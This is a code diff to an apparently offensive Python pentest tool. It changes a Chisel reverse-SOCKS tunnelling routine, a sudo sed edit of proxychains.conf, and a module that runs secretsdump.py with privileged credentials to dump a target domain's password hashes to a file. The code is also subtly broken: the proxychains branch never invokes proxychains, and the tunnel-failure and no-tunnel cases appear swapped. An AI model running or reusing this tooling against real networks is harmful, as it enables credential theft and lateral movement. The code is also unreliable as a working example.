@@ -22,26 +22,18 @@ def tunneltype():
         match tunnel_choice:
             case "SOCKS Proxy":
                 socks_ip = input("Enter SOCKS Server IP: ")
-                socks_port = input("Enter SOCKS Server Port (Default 1080): ")
-
-                # Attempt to connect to the Chisel server
+                socks_port = input("Enter SOCKS Server Port (default: 1080): ") or "1080"
+                command = f"chisel client {socks_ip}:{socks_port} R:socks &"
+                
                 try:
                     print("Connecting to Chisel server...")
+                    subprocess.run(command, shell=True, check=True)
                     print("\033[32m[+] Successfully connected to Chisel server for redirection.\033[0m")
-                    subprocess.run(
-                        f"chisel client {socks_ip}:{socks_port} R:socks &",
-                        shell=True,
-                        check=True
-                    )
-
-                    print("\033[32m[+] Successfully connected to Chisel server for redirection.\033[0m")
-
-                    use_socks_proxy = True  # Enable the SOCKS proxy flag
-                    return True  # Return True here since the setup is successful
+                    use_socks_proxy = True
+                    return "SOCKS Proxy"
                 except subprocess.CalledProcessError as e:
-                    print("\033[31m[-] Failed to connect to Chisel server or update proxychains.conf. Error:\033[0m", e)
-                    return False
-
+                    print(f"\033[31m[-] Failed to connect to Chisel server. Error:\033[0m {e.stderr}")
+                    return None
             case "SSH Tunnel":
                 ssh_tunnel_ip = input("Enter SSH Tunnel IP: ")
                 ssh_tunnel_port = input("Enter SSH Tunnel Port (default: 22): ").strip() or "22"
@@ -97,7 +89,6 @@ def tunneltype():
     else:
         return True
 
-
 def creds():
     print("\033[94mModule Selected: Domain Credentials Dump\033[0m")
     domain = input("Enter Target Domain (Ex: steel.arizona.tu): ")
@@ -105,40 +96,45 @@ def creds():
     password = input("Enter High Privileged LDAP User's Password: ")
     target = input("Enter Target IP: ")
 
-    tunneltype()
-    # Check if SOCKS Proxy is enabled from tunneltype()
-    if use_socks_proxy:
-        print("\033[32m[+] Using SOCKS Proxy for secretsdump.\033[0m")
-        command = [
-            f"proxychains python /usr/local/bin/secretsdump.py '{domain}/{username}:{password}'@{target} -outputfile secretsdump_output.txt"
-        ]
-    else:
+    tunnel_result = tunneltype()
+    
+    if tunnel_result == "SOCKS Proxy":
+        # Update proxychains.conf if needed
+        sed_command = f"sudo sed -i 's/^socks5.*$/socks5 127.0.0.1 1080/' /etc/proxychains.conf"
+        subprocess.run(sed_command, shell=True, check=True)
+        print("\033[32m[+] Updated proxychains.conf for SOCKS Proxy.\033[0m")
+        
+        # Command with proxychains
         command = [
             "python",
             "/usr/local/bin/secretsdump.py",
-            f"'{domain}/{username}:{password}'@{target}",
+            f"{domain}/{username}:{password}@{target}",
             "-outputfile",
             "secretsdump_output.txt"
         ]
+    elif tunnel_result is None:
+        # Direct command without tunneling
+        command = [
+            "python",
+            "/usr/local/bin/secretsdump.py",
+            f"{domain}/{username}:{password}@{target}",
+            "-outputfile",
+            "secretsdump_output.txt"
+        ]
+    else:
+        print("\033[31m[-] Tunnel setup failed. Exiting credentials module.\033[0m")
+        return
 
-    # Print the exact command being run
+    # Print and execute the command
     print("\033[33m[!] Command to be executed:\033[0m", " ".join(command))
-
-    outfile = "secretsdump_output.txt"  # Define your desired output file here
-
     try:
-        print("\033[32m[+] Running secretsdump with sudo...\033[0m")
-        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True, timeout=60)
+        result = subprocess.run(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
         print("\033[32m[+] Secretsdump completed successfully. Output saved to secretsdump_output.txt.\033[0m")
         print("\033[32m[+] Command Output:\033[0m")
         print(result.stdout)
-
-        if result.stderr:
-            print("\033[33m[!] Command Warnings or Errors:\033[0m")
-            print(result.stderr)
     except subprocess.CalledProcessError as e:
-       print(f"\033[31m[-] Secretsdump failed. Error:\033[0m")
-       print(e.stderr)
+        print(f"\033[31m[-] Secretsdump failed. Error:\033[0m")
+        print(e.stderr)
 
 def ldap():
     # Placeholder for LDAP domain dump functionality
